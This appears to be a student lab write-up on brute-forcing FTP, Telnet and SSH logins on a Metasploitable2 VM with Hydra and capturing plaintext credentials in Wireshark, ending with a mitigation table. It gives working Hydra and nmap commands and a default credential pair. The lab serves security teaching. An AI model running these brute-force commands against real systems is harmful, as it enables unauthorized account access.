

# 💻 Labwork 1: Brute Force and Sniffing

---
## 🎯 Objectives

- Understand how brute-force attacks work on common network services (FTP, Telnet, SSH).
- Practice using tools like Hydra for password attacks.
- Learn how to use Wireshark to analyze network traffic.
- Identify insecure protocols that transmit data in plaintext.
- Propose secure alternatives and mitigation strategies.

## 🧰 Tools Used
- **Hydra** – for performing brute force attacks  
- **Wireshark** – for capturing and analyzing network traffic  
- **Kali Linux** – used as the attacker machine  
- **Metasploitable2** – vulnerable virtual machine  
- **FTP, Telnet, SSH** – services used for login and analysis  

---

## 📍 Target IP Enumeration


Run the following command on **Kali Linux** to find the Metasploitable2 IP:

      netdiscover
or:

      nmap -sn 192.168.154.0/24
or:

Use this command on Metasploitable2:

      ifconfig


# 1. Enumeration of Usernames🥐

Initial usernames used for brute force attacks were manually prepared in a file usernames.txt:
1.1 Prepare a text file with potential usernames:

    vim username.txt

- msfadmin
- user
- admin
- root
- test
- guest
  

1.2 Prepare a text file with potential passwords:

      vim password.txt

- msfadmin
- user
- admin
- root
- test
- guest

![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20122646.png?raw=true)


# 2. Brute Force Attacks🥖

**2.1 FTP**
    - Tool: Hydra
    - Command Used:
        
          hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133
![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20122731.png?raw=true)
Result: Successful login found – msfadmin:msfadmin

---

**2.2 Telnet**
    - Tool: Hydra
    - Command Used:
       
        hydra -l msfadmin -P passwords.txt telnet://192.168.154.133

Result: Successful login – msfadmin:msfadmin

---

**2.3 SSH**
    - Tool: Hydra
    - Command Used:
        
        hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133

Problem: Hydra (or the SSH client it's using) doesn't support the older key exchange algorithms used by the Meta2 machine, which is very outdated



# 3. Sniffing Network Traffic🍖

**3.1 Start Wireshark on Kali**

a) Open Wireshark

b) Select the active network interface (e.g., eth0 or ens33).

c) Start capturing

---

**3.2 FTP Login Traffic Analysis**

a) Connect using:

    ftp 192.168.154.133

b) Login with: msfadmin:msfadmin

c) In Wireshark, use filter:

    ftp 

---
**3.3 Telnet Login Traffic Analysis**

a) Connect using 

    telnet 192.168.154.133

b) Login with: msfadmin:msfadmin

c) In Wireshark, use filter:

    telnet



# 4.Problems Encountered🍕

| Protocol | Problem | Solution |
|----------|---------|----------|
|FTP	   |None	 |N/A
|Telnet|	Service was off initially	|Enabled Telnet on Metasploitable2
|SSH	|Hydra connection failed due to key mismatch	|

# 5.Mitigation Strategies🍥

| Protocol | Vulnerability | Secure Alternative	| Why it’s better|
|-----------|-------------|---------------------|---------------|
|FTP	|Sends credentials in plaintext	|SFT2P / FTPS|	Encrypts file transfer data and credentials
|Telnet|	Transmits all in plaintext|	SSH	|SSH encrypts communication
|SSH	|Still brute-forceable	|Use key-based login, strong passwords	|Prevents brute force access

# ✅ Summary
- FTP and Telnet are insecure protocols that transmit credentials in plaintext.
- Hydra can easily brute-force weak credentials.
- SSH is secure but can still be targeted using brute-force unless hardened.
- Use tools like Wireshark to confirm data security over the network.
- Always replace insecure services with encrypted alternatives like SSH or FTPS.
- Apply proper access control, firewalls, and monitoring to reduce attack surfaces.

